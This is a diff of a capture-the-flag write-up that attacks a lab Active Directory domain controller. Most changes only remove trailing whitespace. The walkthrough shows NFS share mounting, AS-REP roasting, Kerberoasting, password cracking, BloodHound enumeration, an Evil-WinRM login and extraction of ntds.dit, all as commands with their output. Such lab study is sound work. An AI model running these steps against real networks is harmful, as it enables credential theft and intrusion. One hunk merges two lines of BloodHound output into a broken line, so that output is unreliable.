@@ -80,9 +80,9 @@ Nmap done: 1 IP address (1 host up) scanned in 90.64 seconds
 We have a standard Active Directory services running. Specially services like smb, nfs, rdp, winrm, etc. can be noted. We will add the findings in the hosts file.
 
 ```bash
-kali@klai:cat /etc/hosts                                                                                                                                 
+kali@klai:cat /etc/hosts
 10.48.128.121   HAVEN-DC.raz0rblack.thm HAVEN-DC raz0rblack.thm raz0rblack
- 
+
 127.0.0.1       localhost
 127.0.1.1       kali.kali       kali
 
@@ -95,7 +95,7 @@ ff02::2 ip6-allrouterso
 Let's start with smb, checking if we have guest logon allowed.
 
 ```bash
-kalI@kali:smbclient -L //10.48.128.121                                                                                                                   
+kalI@kali:smbclient -L //10.48.128.121
 Password for [WORKGROUP\kali]:
 Anonymous login successful
 
@@ -109,7 +109,7 @@ Unable to connect with SMB1 -- no workgroup available
 So, no smb login allowed. Then, let's head to nfs service.
 
 ```bash
-kali@kali:showmount -e 10.48.128.121                                                                                                                     
+kali@kali:showmount -e 10.48.128.121
 Export list for 10.48.128.121:
 /users (everyone)
 ```
@@ -117,14 +117,14 @@ Export list for 10.48.128.121:
 We can mount it on our machine.
 
 ```bash
-kali@kali:sudo mount -t nfs -o nfsvers=3 10.48.128.121:/users /tmp/remote                                                                                
+kali@kali:sudo mount -t nfs -o nfsvers=3 10.48.128.121:/users /tmp/remote
 Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
 ```
 
 Let's see what it has for us.
 
 ```bash
-kali@kali:ls                                                                                                                                             
+kali@kali:ls
 employee_status.xlsx  sbradley.txt
 ```
 
@@ -145,7 +145,7 @@ employee_status.xlsx: Microsoft Excel 2007+
 So, we have a excel sheet, we can create a simple python script to dump the data.
 
 ```bash
-kali@kali:cat extract.py                                                                                                                                 
+kali@kali:cat extract.py
 import pandas as pd
 df = pd.DataFrame(pd.read_excel("/tmp/remote/employee_status.xlsx"))
 print(df)
@@ -154,7 +154,7 @@ print(df)
 Let's run the script.
 
 ```bash
-kali@kali:python3 extract.py                                                                                                                             
+kali@kali:python3 extract.py
    HAVEN SECRET HACKER's CLUB  Unnamed: 1  Unnamed: 2                                    Unnamed: 3
 0                         NaN         NaN         NaN                                           NaN
 1                         NaN         NaN         NaN                                           NaN
@@ -192,8 +192,8 @@ clin
 Since, we have usernames, let's try AS-REP Roasting, to see if we can get any hashes.
 
 ```bash
-kali@kali:impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt -format hashcat                                                                   
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt -format hashcat
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
@@ -209,12 +209,12 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:e85453.....0d494a5
 We got a AS-REP hash for user twilliams. Let's crack it using john.
 
 ```bash
-kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                          
+kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-ro...es    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)     
+ro...es    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)
 1g 0:00:00:03 DONE (2026-02-28 17:31) 0.2604g/s 1099Kp/s 1099Kc/s 1099KC/s rob3560..roastedfish
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -223,7 +223,7 @@ Session completed.
 Since, we have a valid set of credentials, let's start bloodhound to get a view on this Active Directory.
 
 ```bash
-kali@kali:bloodhound-python -u 'twilliams' -p 'ro...es' -d 'raz0rblack.thm' -dc 'HAVEN-DC.raz0rblack.thm' -ns 10.48.128.121 --dns-tcp -c All       
+kali@kali:bloodhound-python -u 'twilliams' -p 'ro...es' -d 'raz0rblack.thm' -dc 'HAVEN-DC.raz0rblack.thm' -ns 10.48.128.121 --dns-tcp -c All
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: raz0rblack.thm
 INFO: Getting TGT for user
@@ -234,9 +234,8 @@ INFO: Found 1 domains in the forest
 INFO: Found 1 computers
 INFO: Connecting to LDAP server: HAVEN-DC.raz0rblack.thm
 WARNING: Kerberos auth to LDAP failed, trying NTLM
-INFO: Found 8 users
-INFO: Found 52 groups
-INFO: Found 2 gpos
+INFO: Found 8 usersINFO: Found 52 groups
+INFO: Found 2 gpo
 INFO: Found 2 ous
 INFO: Found 19 containers
 INFO: Found 0 trusts
@@ -272,12 +271,12 @@ HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Bu
 We got the ticket for user xyan1d3, let's crack it.
 
 ```bash
-kali@kali:john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt                                                                             
+kali@kali:john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-cy...28 (?)     
+cy...28 (?)
 1g 0:00:00:04 DONE (2026-02-28 17:51) 0.2433g/s 2157Kp/s 2157Kc/s 2157KC/s cybermilk0..cy2802341
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -286,14 +285,14 @@ Session completed.
 That was successful. Now, we can login as user xyan1d3 via evil-winrm.
 
 ```bash
-kali@kali:evil-winrm -i 10.48.128.121 -u xyan1d3 -p 'cy...28'                                                                                  
-                                        
+kali@kali:evil-winrm -i 10.48.128.121 -u xyan1d3 -p 'cy...28'
+
 Evil-WinRM shell v3.9
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami
 raz0rblack\xyan1d3
@@ -376,17 +375,17 @@ Let's search for flags.
 
 ```bash
 *Evil-WinRM* PS C:\Users\Administrator> dir
-                                                                                                                                                   
-                                                                                                                                                   
-    Directory: C:\Users\Administrator                                                                                                              
-                                                                                                                                                   
-                                                                                                                                                   
-Mode                LastWriteTime         Length Name                                                                                              
-----                -------------         ------ ----                                                                                              
-d-r---        5/21/2021   9:45 AM                3D Objects                                                                                        
-d-r---        5/21/2021   9:45 AM                Contacts                                                                                          
-d-r---        5/21/2021   9:45 AM                Desktop                                                                                           
-d-r---        5/21/2021   9:45 AM                Documents                                                                                         
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/21/2021   9:45 AM                3D Objects
+d-r---        5/21/2021   9:45 AM                Contacts
+d-r---        5/21/2021   9:45 AM                Desktop
+d-r---        5/21/2021   9:45 AM                Documents
 d-r---        5/21/2021   9:45 AM                Downloads
 d-r---        5/21/2021   9:45 AM                Favorites
 d-r---        5/21/2021   9:45 AM                Links
@@ -453,7 +452,7 @@ d-r---        9/15/2018  12:19 AM                Music
 d-r---        9/15/2018  12:19 AM                Pictures
 d-----        9/15/2018  12:19 AM                Saved Games
 d-r---        9/15/2018  12:19 AM                Videos
--a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de                                       finitely_definitely_not_a_flag.exe
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
 ```
 
 This is definitely a flag.
@@ -644,20 +643,20 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-el...mo (experiment_gone_wrong.zip)     
+el...mo (experiment_gone_wrong.zip)
 1g 0:00:00:00 DONE (2026-02-28 18:34) 1.639g/s 13738Kp/s 13738Kc/s 13738KC/s elfo2009..elboty2009
-Use the "--show" option to display all of the cracked passwords reliably                                                                           
+Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
 So, let's extract the files from the zip file.
 
 ```bash
-kali@kali:unzip experiment_gone_wrong.zip                                                                                                                
+kali@kali:unzip experiment_gone_wrong.zip
 Archive:  experiment_gone_wrong.zip
-[experiment_gone_wrong.zip] system.hive password: 
-  inflating: system.hive             
-  inflating: ntds.dit 
+[experiment_gone_wrong.zip] system.hive password:
+  inflating: system.hive
+  inflating: ntds.dit
 ```
 
 Let's dump the hashes.
